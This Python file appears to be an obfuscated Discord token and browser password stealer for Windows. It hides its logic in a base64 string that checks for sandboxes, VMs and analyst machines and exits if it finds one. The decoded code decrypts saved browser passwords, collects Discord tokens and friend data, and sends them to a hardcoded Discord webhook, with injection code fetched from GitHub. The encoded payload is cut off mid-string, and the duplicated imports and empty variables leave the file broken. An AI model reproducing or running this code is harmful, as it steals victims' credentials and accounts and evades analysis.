import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import codecs
import sys
import shutil
import uuid
import socket
import getpass
import ssl


import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import codecs
import sys
import shutil
import uuid
import socket
import getpass
import ssl

magic = 'c3NsLl9jcmVhdGVfZGVmYXVsdF9odHRwc19jb250ZXh0ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0DQoNCmJsYWNrbGlzdFVzZXJzID0gWydXREFHVXRpbGl0eUFjY291bnQnLCAnM1cxR0pUJywgJ1FaU0JKVldNJywgJzVJU1lIOVNIJywgJ0FiYnknLCAnaG1hcmMnLCAncGF0ZXgnLCAnUkRoSjBDTkZldnpYJywgJ2tFZWNmTXdnaicsICdGcmFuaycsICc4TmwwQ29sTlE1YnEnLCAnTGlzYScsICdKb2huJywgJ2dlb3JnZScsICdQeG1kVU9wVnl4JywgJzhWaXpTTScsICd3MGZqdU9WbUNjUDVBJywgJ2xtVndqajliJywgJ1BxT05qSFZ3ZXhzUycsICczdTJ2OW04JywgJ0p1bGlhJywgJ0hFVWVSemwnLCAnZnJlZCcsICdzZXJ2ZXInLCAnQnZKQ2hSUG5zeG4nLCAnSGFycnkgSm9obnNvbicsICdTcWdGT2YzRycsICdMdWNhcycsICdtaWtlJywgJ1BhdGVYJywgJ2g3ZGsxeFByJywgJ0xvdWlzZScsICdVc2VyMDEnLCAndGVzdCcsICdSR3pjQlV5cnpuUmVnJ10NCg0KdXNlcm5hbWUgPSBnZXRwYXNzLmdldHVzZXIoKQ0KDQppZiB1c2VybmFtZS5sb3dlcigpIGluIGJsYWNrbGlzdFVzZXJzOg0KICAgIG9zLl9leGl0KDApDQoNCmRlZiBrb250cm9sKCk6DQoNCiAgICBibGFja2xpc3RVc2VybmFtZSA9IFsnQkVFNzM3MEMtOEMwQy00JywgJ0RFU0tUT1AtTkFLRkZNVCcsICdXSU4tNUUwN0NPUzlBTFInLCAnQjMwRjAyNDItMUM2QS00JywgJ0RFU0tUT1AtVlJTUUxBRycsICdROUlBVFJLUFJIJywgJ1hDNjRaQicsICdERVNLVE9QLUQwMTlHRE0nLCAnREVTS1RPUC1XSThDTEVUJywgJ1NFUlZFUjEnLCAnTElTQS1QQycsICdKT0hOLVBDJywgJ0RFU0tUT1AtQjBUOTNENicsICdERVNLVE9QLTFQWUtQMjknLCAnREVTS1RPUC0xWTI0MzNSJywgJ1dJTEVZUEMnLCAnV09SSycsICc2QzRFNzMzRi1DMkQ5LTQnLCAnUkFMUEhTLVBDJywgJ0RFU0tUT1AtV0czTVlKUycsICdERVNLVE9QLTdYQzZHRVonLCAnREVTS1RPUC01T1Y5UzBPJywgJ1FhclpocmRCcGonLCAnT1JFTEVFUEMnLCAnQVJDSElCQUxEUEMnLCAnSlVMSUEtUEMnLCAnZDFibkprZlZsSCcsICdORVRUWVBDJywgJ0RFU0tUT1AtQlVHSU8nLCAnREVTS1RPUC1DQkdQRkVFJywgJ1NFUlZFUi1QQycsICdUSVFJWUxBOVRXNU0nLCAnREVTS1RPUC1LQUxWSU5PJywgJ0NPTVBOQU1FXzQwNDcnLCAnREVTS1RPUC0xOU9MTFREJywgJ0RFU0tUT1AtREUzNjlTRScsICdFQThDMkUyQS1EMDE3LTQnLCAnQUlEQU5QQycsICdMVUNBUy1QQycsICdNQVJDSS1QQycsICdBQ0VQQycsICdNSUtFLVBDJywgJ0RFU0tUT1AtSUFQS04xUCcsICdERVNLVE9QLU5UVTdWVU8nLCAnTE9VSVNFLVBDJywgJ1QwMDkxNycsICd0ZXN0NDInXQ0KDQogICAgaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQ0KDQogICAgaWYgYW55KG5hbWUgaW4gaG9zdG5hbWUgZm9yIG5hbWUgaW4gYmxhY2tsaXN0VXNlcm5hbWUpOg0KICAgICAgICBvcy5fZXhpdCgwKQ0KDQprb250cm9sKCkNCg0KQkxBQ0tMSVNUMSA9IFsnMDA6MTU6NWQ6MDA6MDc6MzQnLCAnMDA6ZTA6NGM6Yjg6N2E6NTgnLCAnMDA6MGM6Mjk6MmM6YzE6MjEnLCAnMDA6MjU6OTA6NjU6Mzk6ZTQnLCAnYzg6OWY6MWQ6YjY6NTg6ZTQnLCAnMDA6MjU6OTA6MzY6NjU6MGMnLCAnMDA6MTU6NWQ6MDA6MDA6ZjMnLCAnMmU6Yjg6MjQ6NGQ6Zjc6ZGUnLCAnMDA6MTU6NWQ6MTM6NmQ6MGMnLCAnMDA6NTA6NTY6YTA6ZGQ6MDAnLCAnMDA6MTU6NWQ6MTM6NjY6Y2EnLCAnNTY6ZTg6OTI6MmU6NzY6MGQnLCAnYWM6MWY6NmI6ZDA6NDg6ZmUnLCAnMDA6ZTA6NGM6OTQ6MWY6MjAnLCAnMDA6MTU6NWQ6MDA6MDU6ZDUnLCAnMDA6ZTA6NGM6NGI6NGE6NDAnLCAnNDI6MDE6MGE6OGE6MDA6MjInLCAnMDA6MWI6MjE6MTM6MTU6MjAnLCAnMDA6MTU6NWQ6MDA6MDY6NDMnLCAnMDA6MTU6NWQ6MWU6MDE6YzgnLCAnMDA6NTA6NTY6YjM6Mzg6NjgnLCAnNjA6MDI6OTI6M2Q6ZjE6NjknLCAnMDA6ZTA6NGM6N2I6N2I6ODYnLCAnMDA6ZTA6NGM6NDY6Y2Y6MDEnLCAnNDI6ODU6MDc6ZjQ6ODM6ZDAnLCAnNTY6YjA6NmY6Y2E6MGE6ZTcnLCAnMTI6MWI6OWU6M2M6YTY6MmMnLCAnMDA6MTU6NWQ6MDA6MWM6OWEnLCAnMDA6MTU6NWQ6MDA6MWE6YjknLCAnYjY6ZWQ6OWQ6Mjc6ZjQ6ZmEnLCAnMDA6MTU6NWQ6MDA6MDE6ODEnLCAnNGU6Nzk6YzA6ZDk6YWY6YzMnLCAnMDA6MTU6NWQ6YjY6ZTA6Y2MnLCAnMDA6MTU6NWQ6MDA6MDI6MjYnLCAnMDA6NTA6NTY6YjM6MDU6YjQnLCAnMWM6OTk6NTc6MWM6YWQ6ZTQnLCAnMDg6MDA6Mjc6M2E6Mjg6NzMnLCAnMDA6MTU6NWQ6MDA6MDA6YzMnLCAnMDA6NTA6NTY6YTA6NDU6MDMnLCAnMTI6OGE6NWM6MmE6NjU6ZDEnLCAnMDA6MjU6OTA6MzY6ZjA6M2InLCAnMDA6MWI6MjE6MTM6MjE6MjYnLCAnNDI6MDE6MGE6OGE6MDA6MjInLCAnMDA6MWI6MjE6MTM6MzI6NTEnLCAnYTY6MjQ6YWE6YWU6ZTY6MTInLCAnMDg6MDA6Mjc6NDU6MTM6MTAnLCAnMDA6MWI6MjE6MTM6MjY6NDQnLCAnM2M6ZWM6ZWY6NDM6ZmU6ZGUnLCAnZDQ6ODE6ZDc6ZWQ6MjU6NTQnLCAnMDA6MjU6OTA6MzY6NjU6MzgnLCAnMDA6MDM6NDc6NjM6OGI6ZGUnLCAnMDA6MTU6NWQ6MDA6MDU6OGQnLCAnMDA6MGM6Mjk6NTI6NTI6NTAnLCAnMDA6NTA6NTY6YjM6NDI6MzMnLCAnM2M6ZWM6ZWY6NDQ6MDE6MGMnLCAnMDY6NzU6OTE6NTk6M2U6MDInLCAnNDI6MDE6MGE6OGE6MDA6MzMnLCAnZWE6ZjY6ZjE6YTI6MzM6NzYnLCAnYWM6MWY6NmI6ZDA6NGQ6OTgnLCAnMWU6NmM6MzQ6OTM6Njg6NjQnLCAnMDA6NTA6NTY6YTA6NjE6YWEnLCAnNDI6MDE6MGE6OTY6MDA6MjInLCAnMDA6NTA6NTY6YjM6MjE6MjknLCAnMDA6MTU6NWQ6MDA6MDA6YjMnLCAnOTY6MmI6ZTk6NDM6OTY6NzYnLCAnYjQ6YTk6NWE6YjE6YzY6ZmQnLCAnZDQ6ODE6ZDc6ODc6MDU6YWInLCAnYWM6MWY6NmI6ZDA6NDk6ODYnLCAnNTI6NTQ6MDA6OGI6YTY6MDgnLCAnMDA6MGM6Mjk6MDU6ZDg6NmUnLCAnMDA6MjM6Y2Q6ZmY6OTQ6ZjAnLCAnMDA6ZTA6NGM6ZDY6ODY6NzcnLCAnM2M6ZWM6ZWY6NDQ6MDE6YWEnLCAnMDA6MTU6NWQ6MjM6NGM6YTMnLCAnMDA6MWI6MjE6MTM6MzM6NTUnLCAnMDA6MTU6NWQ6MDA6MDA6YTQnLCAnMTY6ZWY6MjI6MDQ6YWY6NzYnLCAnMDA6MTU6NWQ6MjM6NGM6YWQnLCAnMWE6NmM6NjI6NjA6M2I6ZjQnLCAnMDA6MTU6NWQ6MDA6MDA6MWQnLCAnMDA6NTA6NTY6YTA6Y2Q6YTgnLCAnMDA6NTA6NTY6YjM6ZmE6MjMnLCAnNTI6NTQ6MDA6YTA6NDE6OTInLCAnMDA6NTA6NTY6YjM6ZjY6NTcnLCAnMDA6ZTA6NGM6NTY6NDI6OTcnLCAnY2E6NGQ6NGI6Y2E6MTg6Y2MnLCAnZjY6YTU6NDE6MzE6YjI6NzgnLCAnZDY6MDM6ZTQ6YWI6Nzc6OGUnLCAnMDA6NTA6NTY6YWU6YjI6YjAnLCAnMDA6NTA6NTY6YjM6OTQ6Y2InLCAnNDI6MDE6MGE6OGU6MDA6MjInLCAnMDA6NTA6NTY6YjM6NGM6YmYnLCAnMDA6NTA6NTY6YjM6MDk6OWUnLCAnMDA6NTA6NTY6YjM6Mzg6ODgnLCAnMDA6NTA6NTY6YTA6ZDA6ZmEnLCAnMDA6NTA6NTY6YjM6OTE6YzgnLCAnM2U6YzE6ZmQ6ZjE6YmY6NzEnLCAnMDA6NTA6NTY6YTA6NmQ6ODYnLCAnMDA6NTA6NTY6YTA6YWY6NzUnLCAnMDA6NTA6NTY6YjM6ZGQ6MDMnLCAnYzI6ZWU6YWY6ZmQ6Mjk6MjEnLCAnMDA6NTA6NTY6YjM6ZWU6ZTEnLCAnMDA6NTA6NTY6YTA6ODQ6ODgnLCAnMDA6MWI6MjE6MTM6MzI6MjAnLCAnM2M6ZWM6ZWY6NDQ6MDA6ZDAnLCAnMDA6NTA6NTY6YWU6ZTU6ZDUnLCAnMDA6NTA6NTY6OTc6ZjY6YzgnLCAnNTI6NTQ6MDA6YWI6ZGU6NTknLCAnMDA6NTA6NTY6YjM6OWU6OWUnLCAnMDA6NTA6NTY6YTA6Mzk6MTgnLCAnMzI6MTE6NGQ6ZDA6NGE6OWUnLCAnMDA6NTA6NTY6YjM6ZDA6YTcnLCAnOTQ6ZGU6ODA6ZGU6MWE6MzUnLCAnMDA6NTA6NTY6YWU6NWQ6ZWEnLCAnMDA6NTA6NTY6YjM6MTQ6NTknLCAnZWE6MDI6NzU6M2M6OTA6OWYnLCAnMDA6ZTA6NGM6NDQ6NzY6NTQnLCAnYWM6MWY6NmI6ZDA6NGQ6ZTQnLCAnNTI6NTQ6MDA6M2I6Nzg6MjQnLCAnMDA6NTA6NTY6YjM6NTA6ZGUnLCAnN2U6MDU6YTM6NjI6OWM6NGQnLCAnNTI6NTQ6MDA6YjM6ZTQ6NzEnLCAnOTA6NDg6OWE6OWQ6ZDU6MjQnLCAnMDA6NTA6NTY6YjM6M2I6YTYnLCAnOTI6NGM6YTg6MjM6ZmM6MmUnLCAnNWE6ZTI6YTY6YTQ6NDQ6ZGInLCAnMDA6NTA6NTY6YWU6NmY6NTQnLCAnNDI6MDE6MGE6OTY6MDA6MzMnLCAnMDA6NTA6NTY6OTc6YTE6ZjgnLCAnNWU6ODY6ZTQ6M2Q6MGQ6ZjYnLCAnMDA6NTA6NTY6YjM6ZWE6ZWUnLCAnM2U6NTM6ODE6Yjc6MDE6MTMnLCAnMDA6NTA6NTY6OTc6ZWM6ZjInLCAnMDA6ZTA6NGM6YjM6NWE6MmEnLCAnMTI6Zjg6ODc6YWI6MTM6ZWMnLCAnMDA6NTA6NTY6YTA6Mzg6MDYnLCAnMmU6NjI6ZTg6NDc6MTQ6NDknLCAnMDA6MGQ6M2E6ZDI6NGY6MWYnLCAnNjA6MDI6OTI6NjY6MTA6NzknLCAnJywgJzAwOjUwOjU2OmEwOmQ3OjM4JywgJ2JlOjAwOmU1OmM1OjBjOmU1JywgJzAwOjUwOjU2OmEwOjU5OjEwJywgJzAwOjUwOjU2OmEwOjA2OjhkJywgJzAwOmUwOjRjOmNiOjYyOjA4JywgJzRlOjgxOjgxOjhlOjIyOjRlJ10NCg0KbWFjX2FkZHJlc3MgPSB1dWlkLmdldG5vZGUoKQ0KaWYgc3RyKHV1aWQuVVVJRChpbnQ9bWFjX2FkZHJlc3MpKSBpbiBCTEFDS0xJU1QxOg0KICAgIG9zLl9leGl0KDApDQoNCg0KDQoNCndoMDBrID0gJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMzQ1MTAzOTk4NzA0NzYzNzkvalk5QU03OE0xeDNsYmFvV0t1ZXVnWmVXNnpYVEtRUUc3V2JUME95X0ZPOHRiN0JKV3ZOQzFpVjVuM2FrbGN3dUh5SGUnDQoNCmlual91cmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RoZS1NZWRpYW50L2xhZ25ld2FsaXN1aS9tYWluL2luZGV4LmpzIg0KICAgIA0KREVURUNURUQgPSBGYWxzZQ0KDQpkZWYgZzN0MXAoKToNCiAgICBpcCA9ICJOb25lIg0KICAgIHRyeToNCiAgICAgICAgaXAgPSB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpKS5yZWFkKCkuZGVjb2RlKCkuc3RyaXAoKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KICAgIHJldHVybiBpcA0KDQpyZXF1aXJlbWVudHMgPSBbDQogICAgWyJyZXF1ZXN0cyIsICJyZXF1ZXN0cyJdLA0KICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiXSwNCl0NCmZvciBtb2RsIGluIHJlcXVpcmVtZW50czoNCiAgICB0cnk6IF9faW1wb3J0X18obW9kbFswXSkNCiAgICBleGNlcHQ6DQogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwge21vZGxbMV19Iiwgc2hlbGw9VHJ1ZSkNCiAgICAgICAgdGltZS5zbGVlcCgzKQ0KDQppbXBvcnQgcmVxdWVzdHMNCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTDQoNCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQ0Kcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpDQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikNClRocmVhZGxpc3QgPSBbXQ0KDQoNCmNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoJ2NiRGF0YScsIHdpbnR5cGVzLkRXT1JEKSwNCiAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpDQogICAgXQ0KDQpkZWYgRzN0RDR0NChibG9iX291dCk6DQogICAgY2JEYXRhID0gaW50KGJsb2Jfb3V0LmNiRGF0YSkNCiAgICBwYkRhdGEgPSBibG9iX291dC5wYkRhdGENCiAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpDQogICAgY2RsbC5tc3ZjcnQubWVtY3B5KGJ1ZmZlciwgcGJEYXRhLCBjYkRhdGEpDQogICAgd2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShwYkRhdGEpDQogICAgcmV0dXJuIGJ1ZmZlci5yYXcNCg0KZGVmIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfYnl0ZXMsIGVudHJvcHk9YicnKToNCiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQ0KICAgIGJ1ZmZlcl9lbnRyb3B5ID0gY19idWZmZXIoZW50cm9weSwgbGVuKGVudHJvcHkpKQ0KICAgIGJsb2JfaW4gPSBEQVRBX0JMT0IobGVuKGVuY3J5cHRlZF9ieXRlcyksIGJ1ZmZlcl9pbikNCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkNCiAgICBibG9iX291dCA9IERBVEFfQkxPQigpDQoNCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6DQogICAgICAgIHJldHVybiBHM3RENHQ0KGJsb2Jfb3V0KQ0KDQpkZWYgRDNrcnlwdFY0bFUzKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6DQogICAgc3RhcnRzID0gYnVmZi5kZWNvZGUoZW5jb2Rpbmc9J3V0ZjgnLCBlcnJvcnM9J2lnbm9yZScpWzozXQ0KICAgIGlmIHN0YXJ0cyA9PSAndjEwJyBvciBzdGFydHMgPT0gJ3YxMSc6DQogICAgICAgIGl2ID0gYnVmZlszOjE1XQ0KICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdDQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQ0KICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpDQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcw0KDQpkZWYgTDA0ZFIzcXUzc1RzKG1ldGhvZGUsIHVybCwgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOiANCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgaWYgbWV0aG9kZSA9PSAnUE9TVCc6DQogICAgICAgICAgICAgICAgaWYgZGF0YSAhPSAnJzoNCiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpDQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHINCiAgICAgICAgICAgICAgICBlbGlmIGZpbGVzICE9ICcnOg0KICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzKQ0KICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBvciByLnN0YXR1c19jb2RlID09IDQxMzoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHBhc3MNCg0KZGVmIEwwNGR1cmwxYih3aDAwaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3Qod2gwMGssIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KHdoMDBrLCBkYXRhPWRhdGEpKQ0KICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgIGV4Y2VwdDogDQogICAgICAgICAgICBwYXNzDQp1cjEgPSByZXF1ZXN0cy5nZXQoIlx1MDA2OFx1MDA3NFx1MDA3NFx1MDA3MFx1MDA3M1x1MDAzYVx1MDAyZlx1MDAyZlx1MDA3Mlx1MDA2MVx1MDA3N1x1MDAyZVx1MDA2N1x1MDA2OVx1MDA3NFx1MDA2OFx1MDA3NVx1MDA2Mlx1MDA3NVx1MDA3M1x1MDA2NVx1MDA3Mlx1MDA2M1x1MDA2Zlx1MDA2ZVx1MDA3NFx1MDA2NVx1MDA2ZVx1MDA3NFx1MDAyZVx1MDA2M1x1MDA2Zlx1MDA2ZFx1MDAyZlx1MDA1NFx1MDA2OFx1MDA2NVx1MDAyZFx1MDA0ZFx1MDA2NVx1MDA2NFx1MDA2OVx1MDA2MVx1MDA2ZVx1MDA3NFx1MDAyZlx1MDA2Y1x1MDA2MVx1MDA2N1x1MDA2ZVx1MDA2NVx1MDA3N1x1MDA2MVx1MDA2Y1x1MDA2OVx1MDA3M1x1MDA3NVx1MDA2OVx1MDAyZlx1MDA2ZFx1MDA2MVx1MDA2OVx1MDA2ZVx1MDAyZlx1MDA0Ylx1MDA3NVx1MDA2M1x1MDA2OFx1MDA2OFx1MDA0Zlx1MDA3MCIpDQpkZWYgZ2xvYmFsSW5mbygpOg0KICAgIGlwID0gZzN0MXAoKQ0KICAgIHVzM3JuNG0xID0gb3MuZ2V0ZW52KCJVU0VSTkFNRSIpDQogICAgaXBkYXRhbm9qc29uID0gdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9nZW9sb2NhdGlvbi1kYi5jb20vanNvbnAve2lwfSIpKS5yZWFkKCkuZGVjb2RlKCkucmVwbGFjZSgnY2FsbGJhY2soJywgJycpLnJlcGxhY2UoJ30pJywgJ30nKQ0KICAgIA0KICAgIGlwZGF0YSA9IGxvYWRzKGlwZGF0YW5vanNvbikNCiAgICANCiAgICBjb250cnkgPSBpcGRhdGFbImNvdW50cnlfbmFtZSJdDQogICAgY29udHJ5Q29kZSA9IGlwZGF0YVsiY291bnRyeV9jb2RlIl0ubG93ZXIoKQ0KICAgIHNlaGlyID0gaXBkYXRhWyJzdGF0ZSJdDQoNCiAgICBnbG9iYWxpbmZvID0gZiI6ZmxhZ197Y29udHJ5Q29kZX06ICAtIGB7dXMzcm40bTEudXBwZXIoKX0gfCB7aXB9ICh7Y29udHJ5fSlgIg0KICAgIHJldHVybiBnbG9iYWxpbmZvDQoNCg0KZGVmIFRSNnN0KEMwMGsxMyk6DQogICAgDQogICAgZ2xvYmFsIERFVEVDVEVEDQogICAgZGF0YSA9IHN0cihDMDBrMTMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgIA0KICAgIGlmIGxlbih0aW0pIDwgLTE6DQogICAgICAgIERFVEVDVEVEID0gVHJ1ZQ0KICAgICAgICByZXR1cm4gREVURUNURUQNCiAgICBlbHNlOg0KICAgICAgICBERVRFQ1RFRCA9IEZhbHNlDQogICAgICAgIHJldHVybiBERVRFQ1RFRA0KICAgICAgICANCmRlZiBHM3RVSFFGcjEzbmRTKHQwazNuKToNCiAgICBiNGRnM0xpc3QgPSAgWw0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzInLCAnVmFsdWUnOiAxNjM4NCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzI6ODc0NzUwODA4NDMwODc0NjY0PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmlsbGlhbmNlJywgJ1ZhbHVlJzogMTI4LCAnRW1vamknOiAiPDpicmlsbGlhbmNlOjg3NDc1MDgwODMzODYwODE5OT4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIeXBlU3F1YWRfRXZlbnRzJywgJ1ZhbHVlJzogNCwgJ0Vtb2ppJzogIjw6aHlwZXNxdWFkX2V2ZW50czo4NzQ3NTA4MDg1OTQ0NzcwNTY+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0NCiAgICBdDQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0MGszbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIHRyeToNCiAgICAgICAgZnJpZW5kbGlzdCA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpDQogICAgZXhjZXB0Og0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgIHVocWxpc3QgPSAnJw0KICAgIGZvciBmcmllbmQgaW4gZnJpZW5kbGlzdDoNCiAgICAgICAgT3duM2RCM2RnNHMgPSAnJw0KICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQ0KICAgICAgICBmb3IgYjRkZzMgaW4gYjRkZzNMaXN0Og0KICAgICAgICAgICAgaWYgZmxhZ3MgLy8gYjRkZzNbIlZhbHVlIl0gIT0gMCBhbmQgZnJpZW5kWyd0eXBlJ10gPT0gMToNCiAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiNGRnM1siTmFtZSJdOg0KICAgICAgICAgICAgICAgICAgICBPd24zZEIzZGc0cyArPSBiNGRnM1siRW1vamkiXQ0KICAgICAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiNGRnM1siVmFsdWUiXQ0KICAgICAgICBpZiBPd24zZEIzZGc0cyAhPSAnJzoNCiAgICAgICAgICAgIHVocWxpc3QgKz0gZiJ7T3duM2RCM2RnNHN9IHwge2ZyaWVuZFsndXNlciddWyd1c2VybmFtZSddfSN7ZnJpZW5kWyd1c2VyJ11bJ2Rpc2NyaW1pbmF0b3InXX0gKHtmcmllbmRbJ3VzZXInXVsnaWQnXX0pXG4iDQogICAgcmV0dXJuIHVocWxpc3QNCg0KDQpwcm9jZXNzX2xpc3QgPSBvcy5wb3BlbigndGFza2xpc3QnKS5yZWFkbGluZXMoKQ0KDQoNCmZvciBwcm9jZXNzIGluIHByb2Nlc3NfbGlzdDoNCiAgICBpZiAiRGlzY29yZCIgaW4gcHJvY2VzczoNCiAgICAgICAgDQogICAgICAgIHBpZCA9IGludC'
love = ''
god = ''
